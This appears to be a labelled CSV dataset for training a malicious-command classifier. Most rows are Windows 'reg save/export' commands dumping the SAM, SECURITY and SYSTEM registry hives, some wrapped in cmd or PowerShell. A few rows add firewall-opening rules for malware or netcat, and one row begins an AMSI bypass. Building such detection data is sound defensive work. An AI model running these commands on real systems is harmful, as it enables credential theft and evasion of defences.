text,label
reg   export   hklm\sam   c:\windows\temp\j1c2yqk7.save,1
reg export hklm\security c:\windows\temp\bmmktzf5.save,1
reg export hklm\system c:\windows\temp\mccy8c5r.save,1
"cmd.exe /c ""rule:   exfil   data   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   1337""",2
reg export hklm\security c:\windows\temp\ya2sh4je.save,1
rule:   exfil   data   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   1337,2
reg export hklm\sam c:\windows\temp\00ig3jwm.save,1
reg export hklm\system c:\windows\temp\3rhpt0bl.save,1
reg save hklm\security c:\windows\temp\n5lsdshy.save,1
reg save hklm\system c:\windows\temp\rgjk7yoj.save,1
reg save hklm\security c:\windows\temp\y6mr8t3z.save,1
reg save hklm\security c:\windows\temp\ulkbgvts.save,1
reg save hklm\sam c:\windows\temp\ntqzdjku.save,1
reg save hklm\system c:\windows\temp\rewvlz5u.save,1
reg export hklm\security c:\windows\temp\bh3o3vmi.save,1
reg export hklm\system c:\windows\temp\wl7ggyky.save,1
reg export hklm\sam c:\windows\temp\bsag2y4c.save,1
reg save hklm\security c:\windows\temp\jxmkdlfj.save,1
reg export hklm\security c:\windows\temp\ndiud5dt.save,1
reg save hklm\security c:\windows\temp\iz7e8byn.save,1
reg export hklm\system c:\windows\temp\mogt65tc.save,1
reg save hklm\security c:\windows\temp\bn8befr5.save,1
reg save hklm\security c:\windows\temp\c32bl5ns.save,1
reg export hklm\security c:\windows\temp\lgu0ub8y.save,1
reg save hklm\sam c:\windows\temp\eyb5y3sc.save,1
reg save hklm\sam c:\windows\temp\zkcd422u.save,1
reg export hklm\system c:\windows\temp\dib40ml0.save,1
reg save hklm\security c:\windows\temp\89j0sz9j.save,1
reg save hklm\sam c:\windows\temp\qcm4zqeq.save,1
reg save hklm\sam c:\windows\temp\47blimjl.save,1
reg  save  hklm\system  c:\windows\temp\dvmpja7l.save,1
reg save hklm\system c:\windows\temp\zegzwywv.save,1
reg export hklm\sam c:\windows\temp\a454tsi4.save,1
reg export hklm\security c:\windows\temp\8w4wrq6h.save,1
reg save hklm\security c:\windows\temp\2js3gepa.save,1
reg save hklm\security c:\windows\temp\siqd7q3c.save,1
reg save hklm\system c:\windows\temp\3lp07ug6.save,1
reg save hklm\system c:\windows\temp\pwk2v54x.save,1
reg export hklm\sam c:\windows\temp\1cnis7hw.save,1
reg export hklm\security c:\windows\temp\q5oc2191.save,1
"powershell -nop -c ""reg   export   hklm\security   c:\windows\temp\n48j94dd.save""",1
reg save hklm\system c:\windows\temp\q7139wns.save,1
reg save hklm\sam c:\windows\temp\auq4dcqx.save,1
reg save hklm\security c:\windows\temp\qaayt4nx.save,1
reg export hklm\system c:\windows\temp\iu9nyurz.save,1
"cmd.exe /c ""reg  save  hklm\sam  c:\windows\temp\cab39ke9.save""",1
reg export hklm\system c:\windows\temp\lc84yryf.save,1
reg save hklm\system c:\windows\temp\zl5b6mk4.save,1
reg save hklm\sam c:\windows\temp\sv8l0ao4.save,1
"powershell -nop -c ""reg  export  hklm\security  c:\windows\temp\nl111sle.save""",1
reg export hklm\sam c:\windows\temp\wm5yem84.save,1
reg export hklm\sam c:\windows\temp\ztxvgiuz.save,1
reg export hklm\sam c:\windows\temp\mnsv2lu1.save,1
"cmd.exe /c ""reg  save  hklm\system  c:\windows\temp\r9had3dh.save""",1
reg export hklm\security c:\windows\temp\ahw0k2xi.save,1
reg export hklm\sam c:\windows\temp\1mhc9byf.save,1
reg save hklm\security c:\windows\temp\x161sndn.save,1
reg export hklm\sam c:\windows\temp\skoevhyi.save,1
reg export hklm\sam c:\windows\temp\zyk5ujca.save,1
reg export hklm\sam c:\windows\temp\uolzatnh.save,1
reg save hklm\sam c:\windows\temp\vs53wmx9.save,1
reg save hklm\sam c:\windows\temp\g9e4254q.save,1
reg export hklm\sam c:\windows\temp\fqxazp2r.save,1
reg save hklm\security c:\windows\temp\3e1qkc8f.save,1
reg save hklm\security c:\windows\temp\1lhuiswz.save,1
reg export hklm\security c:\windows\temp\1lzvcrid.save,1
reg save hklm\system c:\windows\temp\xc2sgv6n.save,1
reg export hklm\security c:\windows\temp\bfrpampx.save,1
reg export hklm\sam c:\windows\temp\trq4ye50.save,1
reg save hklm\sam c:\windows\temp\57n4pw2o.save,1
reg save hklm\sam c:\windows\temp\zk0cqu56.save,1
reg save hklm\sam c:\windows\temp\3jumk9on.save,1
reg  save  hklm\security  c:\windows\temp\w0pp61fk.save,1
"powershell -nop -c ""reg   save   hklm\security   c:\windows\temp\bl3aip91.save""",1
reg export hklm\security c:\windows\temp\0yaa8cqv.save,1
reg export hklm\system c:\windows\temp\qd39fnbs.save,1
reg export hklm\sam c:\windows\temp\c2wm6ndk.save,1
reg export hklm\system c:\windows\temp\nvuqg66s.save,1
reg save hklm\system c:\windows\temp\mx1gijh9.save,1
"cmd.exe /c ""reg   export   hklm\sam   c:\windows\temp\0sgqb3cx.save""",1
reg save hklm\security c:\windows\temp\rr4qbr63.save,1
"powershell -nop -c ""reg  save  hklm\security  c:\windows\temp\zmonp51e.save""",1
reg save hklm\sam c:\windows\temp\gieu2fft.save,1
reg export hklm\sam c:\windows\temp\34wi3mc8.save,1
reg export hklm\system c:\windows\temp\tjrbhqck.save,1
reg save hklm\security c:\windows\temp\cyv8htmq.save,1
reg export hklm\sam c:\windows\temp\drdj1z8z.save,1
reg save hklm\security c:\windows\temp\lnvlj1vr.save,1
reg export hklm\system c:\windows\temp\i6bndfce.save,1
reg save hklm\security c:\windows\temp\2ohlz7kc.save,1
reg export hklm\system c:\windows\temp\ik86kn0p.save,1
reg save hklm\security c:\windows\temp\cto9mqht.save,1
reg export hklm\sam c:\windows\temp\iqfqt58j.save,1
reg save hklm\security c:\windows\temp\vkxnc1k6.save,1
reg save hklm\sam c:\windows\temp\ej0pt2jy.save,1
reg save hklm\system c:\windows\temp\o3kwi13h.save,1
reg save hklm\system c:\windows\temp\k3fejb24.save,1
reg export hklm\security c:\windows\temp\ip1wdw40.save,1
reg export hklm\system c:\windows\temp\havrvc30.save,1
reg save hklm\security c:\windows\temp\z5wru8a4.save,1
reg export hklm\security c:\windows\temp\p9f2mnss.save,1
reg export hklm\security c:\windows\temp\llql0xh1.save,1
reg export hklm\system c:\windows\temp\0z1ak6in.save,1
"powershell -nop -c ""reg export hklm\sam c:\windows\temp\6bpun8ab.save""",1
reg save hklm\system c:\windows\temp\0a4472fy.save,1
reg export hklm\security c:\windows\temp\lrnwk78d.save,1
reg save hklm\sam c:\windows\temp\kig1ro2e.save,1
reg save hklm\system c:\windows\temp\s0h4wwda.save,1
reg export hklm\system c:\windows\temp\wty6tfnk.save,1
reg save hklm\system c:\windows\temp\cnqegnbz.save,1
reg export hklm\security c:\windows\temp\bh9eym9k.save,1
reg save hklm\sam c:\windows\temp\20u8421u.save,1
reg save hklm\security c:\windows\temp\lw8vq4mz.save,1
reg export hklm\system c:\windows\temp\6088xmmh.save,1
reg save hklm\security c:\windows\temp\zo841ogq.save,1
reg export hklm\security c:\windows\temp\5jakqr5f.save,1
reg save hklm\security c:\windows\temp\vqod4alf.save,1
reg export hklm\sam c:\windows\temp\3g6gitq5.save,1
reg save hklm\system c:\windows\temp\21js3d0p.save,1
reg save hklm\system c:\windows\temp\ey7gplyi.save,1
reg export hklm\sam c:\windows\temp\og5fo41p.save,1
"cmd.exe /c ""reg export hklm\system c:\windows\temp\fsdqnea4.save""",1
reg save hklm\system c:\windows\temp\mfvpf0z3.save,1
reg save hklm\system c:\windows\temp\cpcvdy36.save,1
reg save hklm\sam c:\windows\temp\ytxkg8h3.save,1
reg save hklm\sam c:\windows\temp\ftvrlcum.save,1
reg export hklm\security c:\windows\temp\9eci79fw.save,1
reg export hklm\sam c:\windows\temp\keqzj6we.save,1
reg save hklm\sam c:\windows\temp\7l4a6z2h.save,1
reg export hklm\sam c:\windows\temp\638qf0j0.save,1
reg save hklm\security c:\windows\temp\ediqtk79.save,1
reg export hklm\sam c:\windows\temp\nvyh7hry.save,1
reg export hklm\sam c:\windows\temp\jkq45hah.save,1
reg save hklm\security c:\windows\temp\sr5qbguw.save,1
reg export hklm\system c:\windows\temp\fxzjg3wh.save,1
reg save hklm\security c:\windows\temp\y1llggij.save,1
reg export hklm\system c:\windows\temp\8gbqs8x6.save,1
reg save hklm\system c:\windows\temp\qpade579.save,1
reg save hklm\security c:\windows\temp\l1cs1zy2.save,1
reg save hklm\system c:\windows\temp\47cj27jm.save,1
reg export hklm\sam c:\windows\temp\avum58xo.save,1
reg save hklm\sam c:\windows\temp\6k29y3c8.save,1
reg export hklm\security c:\windows\temp\tnj0zevu.save,1
reg save hklm\security c:\windows\temp\ivgn6cwt.save,1
reg export hklm\security c:\windows\temp\c4wfe7jw.save,1
reg save hklm\system c:\windows\temp\f8ickab6.save,1
reg save hklm\system c:\windows\temp\qadjf0jd.save,1
reg save hklm\security c:\windows\temp\1l9a0luq.save,1
reg save hklm\sam c:\windows\temp\wrhvzzce.save,1
python -m http.server 8080,0
reg export hklm\system c:\windows\temp\m9i8ck28.save,1
reg save hklm\system c:\windows\temp\w4sa7vv9.save,1
reg export hklm\system c:\windows\temp\k17s729d.save,1
reg save hklm\sam c:\windows\temp\4v3tqqgn.save,1
reg save hklm\system c:\windows\temp\eb54tglp.save,1
reg save hklm\sam c:\windows\temp\mwiq0seq.save,1
reg export hklm\sam c:\windows\temp\9y101w4n.save,1
reg save hklm\sam c:\windows\temp\fe8q01ay.save,1
reg save hklm\system c:\windows\temp\shpjrd80.save,1
reg export hklm\security c:\windows\temp\qrotjqge.save,1
reg save hklm\sam c:\windows\temp\1jf81ta6.save,1
"powershell -nop -c ""reg  save  hklm\sam  c:\windows\temp\fdnqc2dp.save""",1
reg export hklm\system c:\windows\temp\ok31snux.save,1
reg export hklm\sam c:\windows\temp\ly2mkzdj.save,1
reg save hklm\security c:\windows\temp\iu58tr48.save,1
$a = [ref].assembly.gettype('system.management.automation.amsiutils'),3
reg save hklm\security c:\windows\temp\bxp5j6l0.save,1
reg save hklm\security c:\windows\temp\5hkzomxs.save,1
reg export hklm\sam c:\windows\temp\1j339d35.save,1
reg export hklm\sam c:\windows\temp\w8b1gm6m.save,1
reg save hklm\sam c:\windows\temp\7lcmvx7g.save,1
reg export hklm\security c:\windows\temp\1w4nezqj.save,1
reg export hklm\security c:\windows\temp\q4ngp378.save,1
"cmd.exe /c ""netsh  advfirewall  firewall  add  rule  name=""bad""  action=allow  protocol=any  port=4444""",2
reg export hklm\system c:\windows\temp\fuy3ibd6.save,1
reg export hklm\sam c:\windows\temp\wwovm9ul.save,1
reg export hklm\sam c:\windows\temp\aa0xfbg5.save,1
"powershell -nop -c ""rule:   c2   beacon   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   1337""",2
reg save hklm\sam c:\windows\temp\kpaag0fy.save,1
reg export hklm\security c:\windows\temp\tb2gnv6l.save,1
reg save hklm\security c:\windows\temp\outr9df4.save,1
reg save hklm\sam c:\windows\temp\s8gtw22d.save,1
reg export hklm\security c:\windows\temp\wmiut46o.save,1
reg save hklm\system c:\windows\temp\8phzgzav.save,1
reg export hklm\sam c:\windows\temp\tfis1mgs.save,1
reg export hklm\security c:\windows\temp\9vbuo2tm.save,1
reg export hklm\security c:\windows\temp\soaqur9u.save,1
reg save hklm\system c:\windows\temp\35h1i5fa.save,1
reg save hklm\security c:\windows\temp\t7h62gtm.save,1
reg export hklm\sam c:\windows\temp\ok0wmt11.save,1
reg save hklm\system c:\windows\temp\nbsvnp01.save,1
reg save hklm\sam c:\windows\temp\3x3lakub.save,1
reg export hklm\security c:\windows\temp\kgtun4np.save,1
reg save hklm\sam c:\windows\temp\r46v7nti.save,1
reg export hklm\security c:\windows\temp\a1reyc2m.save,1
reg export hklm\security c:\windows\temp\iuovak0l.save,1
reg save hklm\sam c:\windows\temp\osorra0k.save,1
reg save hklm\sam c:\windows\temp\4bphnsmu.save,1
reg save hklm\system c:\windows\temp\vdjcroug.save,1
reg export hklm\sam c:\windows\temp\bf56io1u.save,1
reg export hklm\system c:\windows\temp\t7uw3klo.save,1
reg save hklm\sam c:\windows\temp\nm8aitpp.save,1
reg save hklm\system c:\windows\temp\wjvzohoc.save,1
reg export hklm\system c:\windows\temp\ci5ux22e.save,1
reg save hklm\sam c:\windows\temp\b7nplbpt.save,1
reg export hklm\security c:\windows\temp\k1cww0ls.save,1
reg save hklm\system c:\windows\temp\fh35dj34.save,1
reg export hklm\security c:\windows\temp\nv7k36la.save,1
reg export hklm\sam c:\windows\temp\wi8m9wmh.save,1
reg export hklm\sam c:\windows\temp\98xh17ja.save,1
reg export hklm\system c:\windows\temp\jzps443f.save,1
reg save hklm\security c:\windows\temp\5194ihux.save,1
reg save hklm\security c:\windows\temp\gx08ezji.save,1
reg  export  hklm\security  c:\windows\temp\ck9ekq74.save,1
reg export hklm\sam c:\windows\temp\ubm8tqlz.save,1
reg save hklm\sam c:\windows\temp\9tw35zqp.save,1
"cmd.exe /c ""reg export hklm\sam c:\windows\temp\77i8ao4i.save""",1
reg save hklm\system c:\windows\temp\vv5cfvz4.save,1
reg save hklm\security c:\windows\temp\kt2g59ca.save,1
reg save hklm\sam c:\windows\temp\gzylt8bj.save,1
reg export hklm\system c:\windows\temp\07qzjupw.save,1
reg save hklm\system c:\windows\temp\6bjisn1p.save,1
reg export hklm\sam c:\windows\temp\ulanlajn.save,1
"powershell -nop -c ""reg export hklm\security c:\windows\temp\btnjb9x8.save""",1
reg save hklm\sam c:\windows\temp\u916te9a.save,1
reg save hklm\system c:\windows\temp\11gcv2lc.save,1
reg save hklm\security c:\windows\temp\1bfuiwq3.save,1
reg export hklm\system c:\windows\temp\vxhiftfm.save,1
reg  export  hklm\security  c:\windows\temp\j9wvkycd.save,1
reg  save  hklm\system  c:\windows\temp\5krephro.save,1
reg save hklm\security c:\windows\temp\bgc3arqs.save,1
reg export hklm\sam c:\windows\temp\7v4ntxw5.save,1
reg save hklm\sam c:\windows\temp\hur0yilj.save,1
reg save hklm\sam c:\windows\temp\jk5phlof.save,1
reg export hklm\sam c:\windows\temp\wd2p9ni2.save,1
reg export hklm\security c:\windows\temp\tnnaq8di.save,1
reg export hklm\security c:\windows\temp\shmd4lx7.save,1
"cmd.exe /c ""reg export hklm\security c:\windows\temp\xqv997u8.save""",1
"cmd.exe /c ""ipconfig  /all""",0
reg export hklm\security c:\windows\temp\htebiw3e.save,1
reg save hklm\system c:\windows\temp\4xeh2qkm.save,1
reg save hklm\security c:\windows\temp\e0i0n21j.save,1
reg export hklm\sam c:\windows\temp\054psv1r.save,1
reg export hklm\security c:\windows\temp\5hnktvaf.save,1
reg save hklm\system c:\windows\temp\pct8cop3.save,1
reg export hklm\sam c:\windows\temp\9jc4287k.save,1
reg save hklm\security c:\windows\temp\q1oczfuv.save,1
reg export hklm\security c:\windows\temp\9ss8mwx9.save,1
"cmd.exe /c ""reg   save   hklm\system   c:\windows\temp\hyvz1co7.save""",1
reg save hklm\sam c:\windows\temp\7sw8z31o.save,1
reg export hklm\security c:\windows\temp\mrie3gmd.save,1
reg export hklm\sam c:\windows\temp\skb1avsr.save,1
reg export hklm\system c:\windows\temp\dpymiem8.save,1
reg export hklm\sam c:\windows\temp\blhfoc0t.save,1
"powershell -nop -c ""reg  save  hklm\security  c:\windows\temp\iruwe8vl.save""",1
reg export hklm\system c:\windows\temp\2lopzihk.save,1
reg save hklm\system c:\windows\temp\vjg1xvjq.save,1
reg save hklm\sam c:\windows\temp\ghx67m7b.save,1
reg export hklm\system c:\windows\temp\0cgow9ch.save,1
reg export hklm\security c:\windows\temp\af2ckt8i.save,1
reg save hklm\security c:\windows\temp\97pv7geo.save,1
reg save hklm\sam c:\windows\temp\1efogioc.save,1
reg save hklm\sam c:\windows\temp\3hpfm8zl.save,1
reg   export   hklm\security   c:\windows\temp\mdowjrzk.save,1
reg export hklm\sam c:\windows\temp\ly2sm3cw.save,1
reg save hklm\system c:\windows\temp\wh8r7jdz.save,1
reg export hklm\system c:\windows\temp\4027149j.save,1
reg export hklm\sam c:\windows\temp\ibijwor4.save,1
reg save hklm\system c:\windows\temp\99ti8v8q.save,1
reg save hklm\security c:\windows\temp\09fwqoqf.save,1
reg save hklm\security c:\windows\temp\8wi2y4yl.save,1
reg export hklm\sam c:\windows\temp\v0rv2iqc.save,1
reg export hklm\sam c:\windows\temp\n2rxucf3.save,1
reg export hklm\sam c:\windows\temp\m534tcqn.save,1
reg export hklm\sam c:\windows\temp\0scfw14b.save,1
reg export hklm\security c:\windows\temp\2ja56fz1.save,1
reg export hklm\system c:\windows\temp\ss01cu69.save,1
reg save hklm\system c:\windows\temp\7xsaywhu.save,1
reg save hklm\sam c:\windows\temp\jsehmatz.save,1
reg export hklm\sam c:\windows\temp\fwp651qm.save,1
reg save hklm\sam c:\windows\temp\tfnlelap.save,1
reg export hklm\sam c:\windows\temp\ai5y1fyu.save,1
reg export hklm\security c:\windows\temp\tiowvikd.save,1
reg  export  hklm\sam  c:\windows\temp\ea5y7pv7.save,1
reg save hklm\sam c:\windows\temp\rarpkcgh.save,1
reg export hklm\sam c:\windows\temp\x4vajm5h.save,1
reg save hklm\sam c:\windows\temp\4jlx7rmd.save,1
reg save hklm\system c:\windows\temp\pwuq4ibh.save,1
reg export hklm\sam c:\windows\temp\nst1s2g2.save,1
reg save hklm\system c:\windows\temp\pk436tzl.save,1
reg save hklm\sam c:\windows\temp\fjakxfz9.save,1
reg save hklm\system c:\windows\temp\jmq6v5bj.save,1
reg export hklm\system c:\windows\temp\ec0i2wwm.save,1
reg export hklm\security c:\windows\temp\5wh224ab.save,1
reg save hklm\sam c:\windows\temp\hh2z8m5e.save,1
reg save hklm\sam c:\windows\temp\ll9mzaci.save,1
reg save hklm\system c:\windows\temp\weq7dcg6.save,1
reg export hklm\security c:\windows\temp\1nxhdvgr.save,1
reg export hklm\security c:\windows\temp\6rdtmisy.save,1
reg export hklm\security c:\windows\temp\9yv3ebbh.save,1
reg save hklm\security c:\windows\temp\sh5pow9q.save,1
reg save hklm\security c:\windows\temp\usjvrqlm.save,1
reg save hklm\security c:\windows\temp\ymxyjcnw.save,1
reg save hklm\security c:\windows\temp\1qqoref5.save,1
reg save hklm\system c:\windows\temp\4im1grla.save,1
reg save hklm\security c:\windows\temp\ilht8uxn.save,1
reg export hklm\security c:\windows\temp\o9a4z1h6.save,1
reg export hklm\sam c:\windows\temp\c8hshjbf.save,1
reg save hklm\security c:\windows\temp\ampy6u3g.save,1
reg export hklm\system c:\windows\temp\n5dy4icn.save,1
reg save hklm\system c:\windows\temp\oh9a8iw3.save,1
reg save hklm\sam c:\windows\temp\hoyfmtnr.save,1
reg export hklm\system c:\windows\temp\janqb1yr.save,1
reg export hklm\sam c:\windows\temp\qibqjs23.save,1
reg export hklm\sam c:\windows\temp\by3bufgb.save,1
"powershell -nop -c ""reg export hklm\system c:\windows\temp\priha557.save""",1
"cmd.exe /c ""reg  save  hklm\sam  c:\windows\temp\pmysubo0.save""",1
reg save hklm\security c:\windows\temp\up3jgqfs.save,1
reg   save   hklm\security   c:\windows\temp\hntdnp5n.save,1
reg save hklm\system c:\windows\temp\hu1j3t32.save,1
reg save hklm\security c:\windows\temp\iroxna85.save,1
reg save hklm\system c:\windows\temp\jh2fdhfx.save,1
"powershell -nop -c ""reg   export   hklm\sam   c:\windows\temp\w1lxjpnr.save""",1
reg export hklm\sam c:\windows\temp\vlzyosa6.save,1
reg export hklm\security c:\windows\temp\9a23c82l.save,1
reg save hklm\sam c:\windows\temp\pkd5boc3.save,1
reg export hklm\security c:\windows\temp\imy3yq0k.save,1
reg save hklm\security c:\windows\temp\b099ynn9.save,1
reg save hklm\security c:\windows\temp\gp19u2pk.save,1
"cmd.exe /c ""reg  save  hklm\sam  c:\windows\temp\7u5bgg1n.save""",1
reg save hklm\sam c:\windows\temp\d26pzuaw.save,1
